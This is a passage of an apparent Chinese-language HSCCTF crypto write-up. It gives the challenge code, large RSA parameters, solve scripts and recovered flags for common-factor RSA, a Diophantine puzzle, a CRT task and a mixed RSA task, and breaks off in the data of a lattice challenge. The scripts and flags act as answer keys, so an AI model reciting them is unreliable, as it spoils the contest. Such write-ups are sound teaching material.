28799545621025859784610107508239196961299975467825740831913751504915874851330462439158635575405356818113410333683180082332165697120427112955103148744439425445183885200419323900649247390987373643732545351428341672132606990651983217136427779727640093677134233750683573339125630816150512829880758197582740742903567508671599670638441690064624970884849155079924261319378412468315205937959638074779010811695132863607314175199659821450983825173738122749043063821539706648079731459596593171608003970504410762959266052601005965264083020025264976022719772719760327913949451765549596654112776579032915566112007668167772800022899c8 = 1557912453709476966737076991561069916132026563623952214325899450684779611396005511525194425002377424080593548871717093344298154722414402662579348749814362372502553596876087924405512346139642130044966150910684629355033505918013408065432489689359533653824531829749196503353303426506457519870729578421517704788083837871239684468506646791031429111449024396111145925900274462731352865657439734650971847748974665555525054155117163435567228916046859498167502129739768590572170326191362542459346405142436764480239930123323175219488501180973820200030365386979265642090761227134669853119027964377516064450203673169996741108201n9 = 10724722645304259715795299819065674754042984013786210584506231300619560676108475536395272046569973743641251757746061197828519780315618458377103563062231183483417813026164932742828160245936263717653018746001798106670074713826425538758327538077666818411803556790303118703675214570232032363741244652199877829850941356975349610433270602500949664737614829264570720376982697613497917773407899889472415398738368753150300782201701629840263791099898799223939097237737763305744244520913831151361155926462086252389196548583215275230652627205709362921989235487237437830519479308853639024184940767904019468405024567279269194660457c9 = 7054636121132343583858699301095750714111235817920115459468707884725018199621185268565462099537583727231123935665880304441155106987655834264363622503952228720525242179508079016631089564472694196928292967592007090527901832440980478605545275893294775905732209796463597105116676363505607644384293210905609044898854823349412282236466031666385339991490559120640881321780940909164095426401350314009757434019464208207922992311335823038396957805698822367795673327054284423260967631762122524511318733561339982590040303505605155884427567432712042870632816967182611225212150848091424300840160529323960243459920269872536666352976n10 = 16304817901397483417456609341516124523232426780023397228272913044723365389571327797134591736977502692057727416394924310828824378024812777529367342707896494815960255682947685036902235997899886291633609041685897197272675911304941501067794795285949540313990226409651292120126492714998892290044111541098365692731185787360609198921681736777103794430653696698141195954719030883935151980847339939213040373252819145655067286986300641668994700390921458682571619409488233289211738521046085311253119526685912893458131534718050802684180285138809217274273877376347024021056317566312186133916744533463879779997794540361760393219489c10 = 6039122660803656157700054739064564338439549484695206214016006129508782362229842967602464077735874540107161459041835340990108817139672137870642935613531313583963930144871458733026396223674801557621036949312116639217447114899726858984281194116508244403985568785765273838572470898925521147022021516862658967584135454474355381073026066426450614788381002057980590442338766869104957577338546687759141228942149374485785893539335288536729328218172278370763183603422629799846611737710865681572257803448960656692506773086527389616178693152885260795303008111935277529561576915114165678564997923634906377059491989399467738069641n11 = 26625591570108917991847624024325819020320989255483608230644879476517915211995542896341416515605576928392317717654695767006784744751962205355107012859426134474074616134986414248054781712130892076462288761672616993287474215271046602443215449210026303978249752825306035097841429567784265656890801589418315449927543660131967365276637662563112328427813183398517944210120851841495001293543971765864382060100600179108814852829473884481867272716907064729991187798328733196676298681328399250356028155411865948758466337763025886685436650643428510593697176416735568250615673642866668416526682341721998481502482877972649018501469c11 = 20247005397625616228661928392695469647749434533141783786437968083066137357689767280753532605896419173332597529708801946906363780592876111104850302784033136335456683361128603662454728234349563238948801712907903185993561076754164552845510795293521029798357876214260903355702688269527465118808832941386890598851762900876512383557653940846232884627557957652638581022140825373023173482471791720148792301241581919765510220083079365311297081633979398855966991069020584462613981094888736916444009463104235004451765533162593406749138640537670707679905027165914805299755934758172748227146495107002603546338597452964759860431081&#x27;&#x27;&#x27; 爆破找到 $\\gcd(n_i,n_j)&gt;1$ 的情形，即为 $\\gcd(n_i,n_j)=p$。 123456789101112131415161718192021222324252627282930313233343536373839404142n1 = 13266094979118433615107077438835111371457503704538616496563510289250600197984029767950953071723442381279904747724269706555801425883117040972832035397268347603612025741219452353130266755150965019441092380030226256032720651858600172996344598355816134478110939124633509594465443169697188695226358357129879780253706604232278678465680358018262084198108533077519049507811758423498512565521615931699494491595078723098101084217611204442585182103261006086144344612398896576066999950905966920722348056083426326740287336766359383868804991393096926457607860171709146742941740864780610226463852018204647096292737915760430291250813c1 = 10454892625278317641789872724686322205927252335791803070937784201169059579634108503308033729970364983743915474860354063759051514315619953792921367621385574749886778911471839079815820922430263016140141364094131496885155882486798302404238523986615316359385759537428069831379320707742928167131988641527992674882901567191207763547432299532710945549959580670112346830919500694014972444803904248586178887470465867991650480024904327432717911313867713120525202669101524778826445503383549733326775312427637839488477432162027468606568090607495541492335140760946449358303999218277269859230888292780234275495274787996001069959971n2 = 13561524319281645924409429988746244285924512610515302181526524036825687984904507677894611353344735741110533280540372734178963216876945066232927791369207852762146826883906093804958723203309030840804897999205074456325062789110452940484077408580876939074453733126571662068654441714639301799127584606087971553812926212292460761915985786461807649546286330834719746624387850833859250717790492671884734393055454074719585937904232516659582736211933280011591605069686791049628396762690038333975652490908544846890333889140489210242676577675968427325105786641017561929481335597681693818435892140856959673754213600282444761045909c2 = 3809937396638973793281111150837774607768836561256425490071061814543315217182689579329457784159377040740840790603579270672790822179042079055887400637582022659400594844425891666493759469522229692267103516295923589666151948947533002975509430505778081264268698292606209538047240829756919764958544518311993684790118122163859571923899116815269989298822142104789156965964388346807167061332155392766290531602747731916010774318400533536413925876554324550780136191458776623029231802991319498346243427246484439391940676640693616519788950250194620455331557435567742874072637005171754550020619361150150760807391307377493836703076n3 = 20819967432768567938753694422911303382713641435728476601586838051751312782014589687874100683447016549893853820399247909653519950995166805072380656652093579604808569443345700131756901813968185726839863492859231569896747987531341038527577030274701158504736611486411122416871876820360598851918276248520018793494992493852386399935919098185299268920688465446256283333918993392163947559470887074488117510961172278330026050882249897526926951246915378841961743261451053094912730850754242934166148766977209435597121171360066632973035097557482087715745940551760350028517912402795353929678770383484462337839762404384487582066453c3 = 11563829913521314742585136805475993461403465700108053759771484386843765447294825812595747844564874801821547385942939017711043792590427266240133027831461974927558652665067213878683577605892319949704019193752250409813868906421753286690558646631157080887991363101311595921894128110588310204725909211948500421818595333014728114922612870236792445180757918034580210383348205174677492784034863701447097219480133095005954043490631339361280493810083309703940614371501369647446672052159714963350601039281652141446041256158792981347520865671115091097366786582678000769990989485879756562971825181583852052194492966890258786944315n4 = 19517605474769458566764053169103203900538883167125789442948194023333599294853531273087386563161613748743818343948170765525802041313369094525708034240492038517491037697421019698672940028061489377078569027204940525741751607758706837789276571889269840463242449627036923444536643477208091664006240106337894541529098279162689793633659155131183323675883233214674098857553487390844015483326711766090826364639791072315148015450491509411705543419711632894282105698410629463141048089867016193055384530738113369352506445669521342292860468297676826301170714618519525841753642713267083007541894156522819536935129135488289198694889c4 = 12720867554077215609167247949706745145667570273372296302246080668969511222297653722462456233088262153562301044885409538816931281414687572296907970004441185871229786306419586839050961363065587925188623309437687878362349712010861419409491068481019724226070296781806932012179356550421791040143093709543578156689726256993615533679238619784087615967419616376736870824897695863732260595608905898821074250285903989668303290834003098691902990265526695777899489911426855957844561961729063644070823142386451495647995297413399808476505524581260464059786283824394788336780567702950051743361294131648282343329587709077103035316720n5 = 15315765971812428868126611109300419975777573811870059860288938012581131143314666287089472408729190306740351316922426244732585067377217502116440145450875665683575473308102742095244349804293311006664351646952181210686812748912418175736013835669191549110546127830831456068811493086787520032272004231879188572130659936937680177977058975692716116961651093033986073297040678707534300965722868263825444198679243070507413216087205293997006805636338567585815764233374917745809135568855524993022583535608349280044851332779641619210310837108819273508771161881712796235518243572549756276118053736270122787899173695729089911000177c5 = 1996576325989768324317887012680560370528949194626393664650182754791578697786369958145137743555674312911707989139883926276952465377328602829900403114611234863417183707678398047030046855450074260654432278156903388641948696716193734714839957624359533486844023111115297718398319120718217043728064595217651738180806194912581964346594873253580010279706758241793778842399330631789750327865945625117967957133863637176404309782516880511747771793712203903185512285327103080133567660391921038681393551945607152726063692641742286406772926103324078574181176632321287759066802783643421564667257668981655199672490410258387124896839n6 = 22501623321194869030526666823514739767749207843970334295553523279818676682652976959807729381646792676134988101065783136759904452189288813040860021497429422935571083993146794186207853146483681094375360774768406629588311381375206331368965836725531623084019451921330442379292718421616088275750226791314378297932358311378533569620671423740598033204639634035814689781736104197321348154999759210532651451336192376531975837284751978609197068573278551236896713762616106051882505752287773203197087939983952212761603430314087275042009367400077728025285967811883773835952547025411853395307325959904214255100115763377527761863243c6 = 16972901653690784382193404778525843883847230468707217844241233207197480301434902629018088740822889948972102445668033489181324675531537650785766582307112083721410506834279363487814759021815005839906656731069521758605293428928322712895510490968448490116732590950772037788323801838566829526879837783860631971103738986788475652187080935944428662363573097225322630574705977616143315497272754050608117449938161772409924992453640310621899223691851303921323537779068346575997621024660907750345496836548887894110692437965970524341315015139872598871247336564148953981001708145253728789799483753931039894943324458172207408514055n7 = 20222972180177072345801227937253710431874005900913732040381986459681923475683145372990375296354647420667483866455563976492495863306613645199351725323069254033914660444884681801701527128578914815647228265457580192591405358646605069362025887082090772778349481109768859094222573588734354390770166651349176555216207359309348018342505464249804607873118984688190648392606550835717828160317062604597079101529586592809846608153548090689114431569844519317969076852156023429809918618137153901636552629572816865533796914796916912143735510069871682428043277595493567381686086440480398579063801490541087200975224372047447666853577c7 = 19248329020030453774384696880312801243022181399316695013193573740699955812434234453445733160128408889312090775734047782876100145988183327884917215679382382881065419870764186721970622248713761494850863082727373673264251951250813933154161422645331713437130381414540777017708015790836797014483890216068812718266206449620134392843370036352310247384624064366465809379383305877737001168693796305842850301708205795174536047495356081533121119809621200677554802850741327026857766466801847093397207492834507197621929666294565502206253758771807936447505283097006026148803103761799795917848061959407655084012166916418019312249784n8 = 28799545621025859784610107508239196961299975467825740831913751504915874851330462439158635575405356818113410333683180082332165697120427112955103148744439425445183885200419323900649247390987373643732545351428341672132606990651983217136427779727640093677134233750683573339125630816150512829880758197582740742903567508671599670638441690064624970884849155079924261319378412468315205937959638074779010811695132863607314175199659821450983825173738122749043063821539706648079731459596593171608003970504410762959266052601005965264083020025264976022719772719760327913949451765549596654112776579032915566112007668167772800022899c8 = 1557912453709476966737076991561069916132026563623952214325899450684779611396005511525194425002377424080593548871717093344298154722414402662579348749814362372502553596876087924405512346139642130044966150910684629355033505918013408065432489689359533653824531829749196503353303426506457519870729578421517704788083837871239684468506646791031429111449024396111145925900274462731352865657439734650971847748974665555525054155117163435567228916046859498167502129739768590572170326191362542459346405142436764480239930123323175219488501180973820200030365386979265642090761227134669853119027964377516064450203673169996741108201n9 = 10724722645304259715795299819065674754042984013786210584506231300619560676108475536395272046569973743641251757746061197828519780315618458377103563062231183483417813026164932742828160245936263717653018746001798106670074713826425538758327538077666818411803556790303118703675214570232032363741244652199877829850941356975349610433270602500949664737614829264570720376982697613497917773407899889472415398738368753150300782201701629840263791099898799223939097237737763305744244520913831151361155926462086252389196548583215275230652627205709362921989235487237437830519479308853639024184940767904019468405024567279269194660457c9 = 7054636121132343583858699301095750714111235817920115459468707884725018199621185268565462099537583727231123935665880304441155106987655834264363622503952228720525242179508079016631089564472694196928292967592007090527901832440980478605545275893294775905732209796463597105116676363505607644384293210905609044898854823349412282236466031666385339991490559120640881321780940909164095426401350314009757434019464208207922992311335823038396957805698822367795673327054284423260967631762122524511318733561339982590040303505605155884427567432712042870632816967182611225212150848091424300840160529323960243459920269872536666352976n10 = 16304817901397483417456609341516124523232426780023397228272913044723365389571327797134591736977502692057727416394924310828824378024812777529367342707896494815960255682947685036902235997899886291633609041685897197272675911304941501067794795285949540313990226409651292120126492714998892290044111541098365692731185787360609198921681736777103794430653696698141195954719030883935151980847339939213040373252819145655067286986300641668994700390921458682571619409488233289211738521046085311253119526685912893458131534718050802684180285138809217274273877376347024021056317566312186133916744533463879779997794540361760393219489c10 = 6039122660803656157700054739064564338439549484695206214016006129508782362229842967602464077735874540107161459041835340990108817139672137870642935613531313583963930144871458733026396223674801557621036949312116639217447114899726858984281194116508244403985568785765273838572470898925521147022021516862658967584135454474355381073026066426450614788381002057980590442338766869104957577338546687759141228942149374485785893539335288536729328218172278370763183603422629799846611737710865681572257803448960656692506773086527389616178693152885260795303008111935277529561576915114165678564997923634906377059491989399467738069641n11 = 26625591570108917991847624024325819020320989255483608230644879476517915211995542896341416515605576928392317717654695767006784744751962205355107012859426134474074616134986414248054781712130892076462288761672616993287474215271046602443215449210026303978249752825306035097841429567784265656890801589418315449927543660131967365276637662563112328427813183398517944210120851841495001293543971765864382060100600179108814852829473884481867272716907064729991187798328733196676298681328399250356028155411865948758466337763025886685436650643428510593697176416735568250615673642866668416526682341721998481502482877972649018501469c11 = 20247005397625616228661928392695469647749434533141783786437968083066137357689767280753532605896419173332597529708801946906363780592876111104850302784033136335456683361128603662454728234349563238948801712907903185993561076754164552845510795293521029798357876214260903355702688269527465118808832941386890598851762900876512383557653940846232884627557957652638581022140825373023173482471791720148792301241581919765510220083079365311297081633979398855966991069020584462613981094888736916444009463104235004451765533162593406749138640537670707679905027165914805299755934758172748227146495107002603546338597452964759860431081n = []c = []for i in range(1,12): n.append(eval(f&#x27;n&#123;i&#125;&#x27;)) c.append(eval(f&#x27;c&#123;i&#125;&#x27;)) for i in range(11): for j in range(i+1,11): if gcd(n[i],n[j]) != 1: print(i,j) p = gcd(n[4],n[5])q = n[4] // pf = (p-1)*(q-1)d = inverse_mod(65537,f)m = pow(c[4],d,n[4])print(bytes.fromhex(hex(m)[2:]))#HSCCTF&#123;this_1s_yi_zhi_xiao_jiu_li&#125; ​ EZ_MATH 就是数学,学吧 12345678910111213from Crypto.Util.number import *flag = &#x27;HSCCTF&#123;*****************************************&#125;&#x27;x = bytes_to_long(flag.encode())y = getPrime(200)z = getPrime(200)assert (x**2+1)*(y**2+1)*(z**2+1) + 4 * ((x*y*z)*(x+y+z)+(x*y+x*z+y*z)) == jl + 2*(x+y+z+x*y*z)*(x*y+y*z+x*z+1)w = 1007766898498955907869786015006414110177963571599690507305616866798367726133772947904112344473803352290475298324967917118497719002314168582330651485077694557008496465717884047202330407870172675541471666596768873677342429660840647109788577728613362048023960188394853332768656214046219781162891725391990618222498709603165658933818803574737a = jl + 2024b = jl + 2025c = getPrime(1000)assert w*(a*c + b*c - a*b) == 4*a*b*c $w(ac + bc - ab) = 4abc \\Longrightarrow \\cfrac{4}{w} = \\cfrac{1}{a} + \\cfrac{1}{b} - \\cfrac{1}{c}$ 著名丢番图方程，参考 这篇论文 有 $a=\\cfrac{w-1}{2},b=\\cfrac{w+1}{2}$，故而得到 $jl$。 又 $jl=(x^2+1)(y^2+1)(z^2+1) + 4[(xyz)(x+y+z)+(xy+xz+yz)] - 2(x+y+z+xyz)(xy+yz+xz+1)=(x-1)^2(y-1)^2(z-1)^2$， 求出 $\\sqrt{jl}$ 的所有因子，根据 $x,y,z$ 的位数限制，爆破即可。 1234567891011121314151617181920212223242526272829303132333435PR.&lt;x,y,z&gt; = PolynomialRing(ZZ)f=(x**2+1)*(y**2+1)*(z**2+1) + 4 * ((x*y*z)*(x+y+z)+(x*y+x*z+y*z)) - 2*(x+y+z+x*y*z)*(x*y+y*z+x*z+1)print(f.factor())#(z - 1)^2 * (y - 1)^2 * (x - 1)^2import gmpy2from Crypto.Util.number import *w = 1007766898498955907869786015006414110177963571599690507305616866798367726133772947904112344473803352290475298324967917118497719002314168582330651485077694557008496465717884047202330407870172675541471666596768873677342429660840647109788577728613362048023960188394853332768656214046219781162891725391990618222498709603165658933818803574737a = (w-1)//2b = (w+1)//2jl = a-2024s = jl.nth_root(2)print(s)sf = divisors(s)print(len(sf))yz = []for i in range(len(sf)): t = sf[i]+1 if t &gt; 2^200: break if t &gt; 2^199 and t &lt; 2^200 and is_prime(t): yz.append(t)for i in range(len(yz)): for j in range(i+1, len(yz)): x = long_to_bytes(s // ((yz[i]-1)*(yz[j]-1)) + 1) if x.isascii(): print(x) #b&#x27;HSCCTF&#123;math_is_good&#125;&#x27; ​ SIGN_IN 这是签到题啦 1234567891011121314151617181920from Crypto.Util.number import *from random import *from gmpy2 import *flag = &#x27;HSCCTF&#123;66666666666666666666666666666666666&#125;&#x27;m = bytes_to_long(flag.encode())p, q = getPrime(1024), getPrime(1024)n = p * qg, r1, r2, k1, k2 = [randint(1, n) for _ in range(5)]g1 = powmod(g, r1 * (p - 1), n)g2 = powmod(g, r2 * (q - 1), n)c1 = m * powmod(g1, k1, n) % nc2 = m * powmod(g2, k2, n) % nprint(&#x27;enc=&#x27;, [c1, c2])print(&#x27;n, g1, g1=&#x27;, [n, g1, g2])&#x27;&#x27;&#x27;enc= [15258813801182767957948809411445530114743580005667897427534365589851124401953952700888032330082278736578651674105204553630115929829327520950316902504433079359916257355896937562916556083469602985115254272625361902512966905366505705193603115063442567259505806926885597909346860116511116593562896739734663097631870026814495999405532329662713707140991693625596972404484374296588505369466138353714461787853643947646268147993568111775200297788443085689323703846485412670213780175163562460311256388185948613714551169278328397181176821021494625532973065606678522088011055084956579073665474553688838705105692370860815836968744, 6812252973072040071827764212287068485224506664962923279994614164374840095630460681859406585838865259535150445414577263383839286602668872146630568583093203237350230531896113453730563536559780725054737930704052263836882704963528437893607940373145674848731274193348770450738356162141551719346994698149112827383011042635625991946491545698464513315705253441372356270248537025391519052228332747340090073726648071921053097612521949040588826684887577900030607964457543549015338544684381220552952995724701579427363382069065679545196826947900332605250858694574423497096207350532949517663416877954484913664168104807510052994343]n, g1, g1= [20807018344486474639307429177279931766730766338068107239915507489300098048895435781756514265069820029246382818970733268271541419058569567895618666922180270584064313671561310704041755422624879418184008100473568396190523033929320245716340019444764233261191278982354931492880877566550189410854395486995604287009460090861952156686772486228583819235930673806632618770875593810617784176409247510465542253043645164164225524491704753384493817563203956665022724674535516870726747405974392352500432805602085261375142216501656342533659731098891481615791354504343987459436489040377662127479793769523359343534307819013289699807101, 13669954919111873554762685722926885077118528999414402163291237939605095249827361266585404348819936899557500751307328088850133462100189908649705354225171362748567332828733792410877365393472368767642223613483944864421225366984013053159643284842823692865975521013400160643858123645513020647367033022539177063702511618272018019345686324322865461583030805528508961559861228807898458344763909703624723082316946660539208262816734999777236686904487167545596412866146192769859422435979617441355968077981338491466670291310491623996943880557071723073298267310617017933994938481600905833829730599911183096116409487608858717083764, 16004755272896973088305242134835363565950101667041191767091338528075710730690484241256646402124331734165332717221873300040844257120250717798419429003342474882969292183331631773486056363790119500409511338474885148624744719334829519138941747721940978742668429331169327121848561577357339194970483392418062307133642660625962426570987080348107999849220769541832138719358407833846252908305766546561532003650472770370573552424932908544299331489147220956574184822433945571318688467182365231955276573176433559755313822566687880866791301904461559170416753669109833335824210853322226762705537051009387847122221014380228383127427]&#x27;&#x27;&#x27; 参考 V&amp;N2020 - Fast。 1234567891011c1,c2 = [15258813801182767957948809411445530114743580005667897427534365589851124401953952700888032330082278736578651674105204553630115929829327520950316902504433079359916257355896937562916556083469602985115254272625361902512966905366505705193603115063442567259505806926885597909346860116511116593562896739734663097631870026814495999405532329662713707140991693625596972404484374296588505369466138353714461787853643947646268147993568111775200297788443085689323703846485412670213780175163562460311256388185948613714551169278328397181176821021494625532973065606678522088011055084956579073665474553688838705105692370860815836968744, 6812252973072040071827764212287068485224506664962923279994614164374840095630460681859406585838865259535150445414577263383839286602668872146630568583093203237350230531896113453730563536559780725054737930704052263836882704963528437893607940373145674848731274193348770450738356162141551719346994698149112827383011042635625991946491545698464513315705253441372356270248537025391519052228332747340090073726648071921053097612521949040588826684887577900030607964457543549015338544684381220552952995724701579427363382069065679545196826947900332605250858694574423497096207350532949517663416877954484913664168104807510052994343]n, g1, g2= [20807018344486474639307429177279931766730766338068107239915507489300098048895435781756514265069820029246382818970733268271541419058569567895618666922180270584064313671561310704041755422624879418184008100473568396190523033929320245716340019444764233261191278982354931492880877566550189410854395486995604287009460090861952156686772486228583819235930673806632618770875593810617784176409247510465542253043645164164225524491704753384493817563203956665022724674535516870726747405974392352500432805602085261375142216501656342533659731098891481615791354504343987459436489040377662127479793769523359343534307819013289699807101, 13669954919111873554762685722926885077118528999414402163291237939605095249827361266585404348819936899557500751307328088850133462100189908649705354225171362748567332828733792410877365393472368767642223613483944864421225366984013053159643284842823692865975521013400160643858123645513020647367033022539177063702511618272018019345686324322865461583030805528508961559861228807898458344763909703624723082316946660539208262816734999777236686904487167545596412866146192769859422435979617441355968077981338491466670291310491623996943880557071723073298267310617017933994938481600905833829730599911183096116409487608858717083764, 16004755272896973088305242134835363565950101667041191767091338528075710730690484241256646402124331734165332717221873300040844257120250717798419429003342474882969292183331631773486056363790119500409511338474885148624744719334829519138941747721940978742668429331169327121848561577357339194970483392418062307133642660625962426570987080348107999849220769541832138719358407833846252908305766546561532003650472770370573552424932908544299331489147220956574184822433945571318688467182365231955276573176433559755313822566687880866791301904461559170416753669109833335824210853322226762705537051009387847122221014380228383127427]p = gcd(g1-1,n)q = gcd(g2-1,n)print(p*q==n)m = crt([c1%p,c2%q],[p,q])print(bytes.fromhex(hex(m)[2:]))b&#x27;HSCCTF&#123;Any_restr1ct1ons_all_begins_with_his_own_heart&#125;&#x27; ​ MIXED 12345678910111213141516171819202122232425262728293031import libnumfrom flag import flagfrom Crypto.Util.number import *m = libnum.s2n(flag)e = 65537q = getPrime(1024)q1 = getPrime(1024)p = getPrime(1024)p1 = getPrime(1024)n = p * qn1 = q * p1n2 = p * q1c = pow(m, e, n)h0 = pow(2023 * p + 2024, q1, n2)h1 = pow(2024 * p1 + 2023 * q, 114, n1)h2 = pow(2023 * p1 + 2024 * q, 514, n1)print(f&#x27;n1 = &#123;n1&#125;&#x27;)print(f&#x27;n2 = &#123;n2&#125;&#x27;)print(f&#x27;c = &#123;c&#125;&#x27;)print(f&quot;h0 = &#123;h0&#125;&quot;)print(f&quot;h1 = &#123;h1&#125;&quot;)print(f&quot;h2 = &#123;h2&#125;&quot;)# n1 = 14689930167621480307737218855980844793204825453111553640005733004311399091452749419195261723160562669712981077205514482387428543859060408330555457873612388970840075555219318724209919379670375754436986322725018229701175825510253987615017542205904982728558285520666278391637251512741084978804344612886660251741043298476839942441197788722691248949008018299101517153067904692310160459839327965213126456776042470327923603098133019640956702820908299859534676381094974148722668171932091455546601087513513432342088579253210930555185169910878657816252698605590059713584044287411998445279104965229112287195772355914014694372863# n2 = 17914624231045471060767877283214815212078805279600237578901916178851704643026979522270658635212967285131654546207286875722198040564094351690066028556053274118826426726436922152056884333790850220488793722836758989770231697392015361745717234225528175411653330848965062023338707342188196332661335758350340958332400847642883219650661408895191363079017750144776587598058350920393498114498603046807597288603882782473322630631915467470131090200369527436760313289344813744004003957932606166823948354564464154141854938585629799995141656546295799610158824771809513458197812936595649326475123400845178122171317543843802357238737# c = 13183645788828584902734975771833842634134772971197066374278716198331982362845597338541987579827576129126962300555023319276896080171662261983323670516457816608069076576704379871559881585100353737989915143190277856145677733747073530969459479608854483866886381406790221076900624083605418670450439523062190633487764982399334967431524831264337949814367905185282600511829794170139623625545288981992093108619556180352620171550284923452864402624195790781899415138548827684042790774382313520961335293225295922563245148598807498320652973409239921962292395269739151692443069186695137458774227330748775469621908962878548784542656# h0 = 5690435858632801053001568276569200811072324786394351282330736437777643891675713760267573500875018036769819201228707494676033534733516436880434000381152290529934127584047681184797730806321117079578438213106595566102910231831641994870770844810797745935336962801658360541755214075101149142486964461669833043007174173934693214526552375910644574723526164021660497474760514459351270699055076380763188021265735007339272243426286470006040246926184305520860068095134003662496837644875879106318233600478000160450338727054920011063536387532763661934972965357326471012678550188382945584128136131833085006239075931753900705852481# h1 = 12771704142231361356944931328203992824809472923288035056741145310446323135378739806430357600688780862532180394967607429708811767590541126019805423171023560973250443508427614362854583240402451944730512334908779225174763498122005198084487562912524477476241978066554026569609494641830034817298185887790987627444544391680388213205514284116732325350187204519755399841372144149840914651521842402817701298224803289451378581226204084757079457612984358925767378458994608562174048729806309230061089552045138514542758457243626150673888166620841134063713151240297774551489301504222933127458884374866611598279831562420720169790688# h2 = 10768269134499905916388929049595509895751098112372323618798542159569174051578701710549609054808995774168931375186213550074900373023970882450822655786787740452681278837907191091338575561570211280095894576674089666981683405385847773819238581725093823429776684561667462626941518248024517707992035438082636259838822562843169441572048956484831730615047363383911454662789736761572912893234212875097536978423758275178050708616505311352511923810654873380808201395656416903900326634569672173228265730515727327832588326581592485713225927319225942965110285477266200380452637746037672411388696006933080509164615786616058664496851 参考 东华杯 - fermat’s revenge 和 GKCTF 2021 - RRRRsa。 1234567891011121314151617181920212223n1 = 14689930167621480307737218855980844793204825453111553640005733004311399091452749419195261723160562669712981077205514482387428543859060408330555457873612388970840075555219318724209919379670375754436986322725018229701175825510253987615017542205904982728558285520666278391637251512741084978804344612886660251741043298476839942441197788722691248949008018299101517153067904692310160459839327965213126456776042470327923603098133019640956702820908299859534676381094974148722668171932091455546601087513513432342088579253210930555185169910878657816252698605590059713584044287411998445279104965229112287195772355914014694372863n2 = 17914624231045471060767877283214815212078805279600237578901916178851704643026979522270658635212967285131654546207286875722198040564094351690066028556053274118826426726436922152056884333790850220488793722836758989770231697392015361745717234225528175411653330848965062023338707342188196332661335758350340958332400847642883219650661408895191363079017750144776587598058350920393498114498603046807597288603882782473322630631915467470131090200369527436760313289344813744004003957932606166823948354564464154141854938585629799995141656546295799610158824771809513458197812936595649326475123400845178122171317543843802357238737c = 13183645788828584902734975771833842634134772971197066374278716198331982362845597338541987579827576129126962300555023319276896080171662261983323670516457816608069076576704379871559881585100353737989915143190277856145677733747073530969459479608854483866886381406790221076900624083605418670450439523062190633487764982399334967431524831264337949814367905185282600511829794170139623625545288981992093108619556180352620171550284923452864402624195790781899415138548827684042790774382313520961335293225295922563245148598807498320652973409239921962292395269739151692443069186695137458774227330748775469621908962878548784542656h0 = 5690435858632801053001568276569200811072324786394351282330736437777643891675713760267573500875018036769819201228707494676033534733516436880434000381152290529934127584047681184797730806321117079578438213106595566102910231831641994870770844810797745935336962801658360541755214075101149142486964461669833043007174173934693214526552375910644574723526164021660497474760514459351270699055076380763188021265735007339272243426286470006040246926184305520860068095134003662496837644875879106318233600478000160450338727054920011063536387532763661934972965357326471012678550188382945584128136131833085006239075931753900705852481h1 = 12771704142231361356944931328203992824809472923288035056741145310446323135378739806430357600688780862532180394967607429708811767590541126019805423171023560973250443508427614362854583240402451944730512334908779225174763498122005198084487562912524477476241978066554026569609494641830034817298185887790987627444544391680388213205514284116732325350187204519755399841372144149840914651521842402817701298224803289451378581226204084757079457612984358925767378458994608562174048729806309230061089552045138514542758457243626150673888166620841134063713151240297774551489301504222933127458884374866611598279831562420720169790688h2 = 10768269134499905916388929049595509895751098112372323618798542159569174051578701710549609054808995774168931375186213550074900373023970882450822655786787740452681278837907191091338575561570211280095894576674089666981683405385847773819238581725093823429776684561667462626941518248024517707992035438082636259838822562843169441572048956484831730615047363383911454662789736761572912893234212875097536978423758275178050708616505311352511923810654873380808201395656416903900326634569672173228265730515727327832588326581592485713225927319225942965110285477266200380452637746037672411388696006933080509164615786616058664496851e = 65537h1x = pow(h1 * pow(2023,114,n1),514,n1)h2x = pow(h2 * pow(2024,514,n1),114,n1)q = gcd(h2x-h1x,n1)print(q)kp = h0-pow(2024,n2,n2)p = gcd(n2,kp)print(p)f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,p*q)print(bytes.fromhex(hex(m)[2:]))#b&#x27;hscctf&#123;35d7ecc2-6216-4f09-b052-3de921f170b6&#125;&#x27; ​ YOUQU 出题人很有趣,给你函数了直接解吧 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import numpy as npfrom numpy.polynomial import polynomial as polyfrom Crypto.Util.number import *def mul(x, y, z, mod): init_poly = poly.polymul(x, y) res_poly = poly.polydiv(init_poly % z, mod)[1] % z return np.int64(np.round(res_poly))def add(x, y, z, mod): init_poly = poly.polyadd(x, y) res_poly = poly.polydiv(init_poly % z, mod)[1] % z return np.int64(np.round(res_poly))def q2(lenth1): return np.random.randint(0, 2, lenth1, dtype=np.int64)def qz(z, lenth1): return np.random.randint(0, z, lenth1, dtype=np.int64)def guess(lenth1): return np.int64(np.random.normal(0, 2, size=lenth1))def jlkey(lenth1, z, mod): s = q2(lenth1) g = qz(z, lenth1) e1 = guess(lenth1) t = add(mul(g, s, z, mod), e1, z, mod) key = [g, t, s] return keydef jl(key, length1, n, p, mod, msg): jlm = [] mm = hex(msg)[2:] for i in range(0, len(mm)): jlm.append(ord(mm[i])) m = np.array(jlm + [0] * (length1 - len(jlm)), dtype=np.int64) % p d = n // p dm = d * m % n e2 = guess(length1) e3 = guess(length1) r = q2(length1) g = key[0] t = key[1] w = add(add(mul(t, r, n, mod), e2, n, mod), dm, n, mod) v = add(mul(g, r, n, mod), e3, n, mod) c = [w, v] return co = 128n = 2 ** 62p = 2 ** 32mod = np.array([1] + [0] * (o - 1) + [1])key = jlkey(o, n, mod)flag = &#x27;HSCCTF&#123;fakeflag_xin_nian_kuai_le&#125;&#x27;m = bytes_to_long(flag.encode())c = jl(key, o, n, p, mod, m)print(&quot;w =&quot;, c[0].tolist())print(&quot;v =&quot;, c[1].tolist())print(&quot;g =&quot;, key[0].tolist())print(&quot;t =&quot;, key[1].tolist())print(&quot;s =&quot;, key[1].tolist())&#x27;&#x27;&#x27;w = [4456121292753321984, 2695388220323384832, 1125798304404134912, 1389165333028469760, 3720515311443086336, 1806160162087117824, 1710165564223285248, 3854525633894178816, 4160032803226148864, 3223993978734964736, 188029029972998144, 2283288149728718848, 178098730553155584, 400166020473782272, 4426677526375129088, 1768526165797007360, 4596103848246980608, 3143341953117548544, 4113813229295153152, 1444787342796136448, 1749143783191330816, 601663717837410304, 1976180375223943168, 899486064067571712, 2467702122158211072, 1442313048691163136, 2977506408218411008, 1106991111199326208, 844904722420957184, 1013497211561496576, 4250614525386129408, 1677797764964532224, 4212901529405988864, 2561734724771299328, 1890807629146202112, 951039123411230720, 881428262835757056, 514344970914586624, 3072465238399721472, 1294633561516974080, 4471068621313253376, 2978038764905480192, 1256294011046658048, 2885789906784919552, 1808546586690191360, 3846883621647482880, 